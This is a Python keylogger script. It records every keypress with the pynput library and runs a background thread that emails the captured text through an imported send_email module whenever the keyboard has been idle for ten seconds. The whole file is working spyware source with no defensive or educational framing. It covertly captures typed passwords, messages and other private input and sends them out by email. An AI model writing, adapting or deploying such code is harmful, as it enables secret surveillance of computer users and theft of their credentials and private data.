import pynput
from pynput.keyboard import Key, Listener
import send_email
import threading
import time

keys = []
idle_timer = 0

def on_press(key):
    global keys, idle_timer
    keys.append(str(key))
    idle_timer = 0  # Reset the idle timer when a key is pressed

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)
    keys.clear()  # Clear the keys after sending the email

def check_idle_time():
    global idle_timer
    while True:
        time.sleep(1)  # Sleep for 1 second
        idle_timer += 1
        if idle_timer >= 10:  # If no key presses for 10 seconds, send email
            if keys:
                email(keys)

# Start the timer thread for checking idle time
idle_timer_thread = threading.Thread(target=check_idle_time)
idle_timer_thread.start()

# Start the listener for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
